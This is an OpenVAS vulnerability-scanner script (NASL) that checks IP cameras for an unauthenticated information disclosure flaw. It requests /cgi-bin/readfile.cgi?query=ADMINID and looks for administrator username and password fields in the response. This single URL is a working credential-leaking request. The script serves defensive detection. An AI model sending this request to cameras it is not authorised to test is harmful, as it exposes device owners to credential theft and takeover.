###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mult_ip_cameras_info_discl_vuln.nasl 11343 2018-09-12 06:36:46Z cfischer $
#
# Multiple IP-Cameras Information Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106212");
  script_version("$Revision: 11343 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-12 08:36:46 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-08-29 12:52:32 +0700 (Mon, 29 Aug 2016)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Multiple IP-Cameras Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The IP-Camera is prone to an information disclosure vulnerability.");

  script_tag(name:"insight", value:"It is possible for a unauthenticated remote attacker to get the
administrator username and password from this IP-Camera.");

  script_tag(name:"impact", value:"An unauthenticated attacker can receive the administrator username and
its password.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40264/");

  script_tag(name:"vuldetect", value:"Tries to get the username and password.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 80);

url = "/cgi-bin/readfile.cgi?query=ADMINID";

if (http_vuln_check(port: port, url: url, pattern: "Adm_ID=", check_header: TRUE, extra_check: "Adm_PASS1=")) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
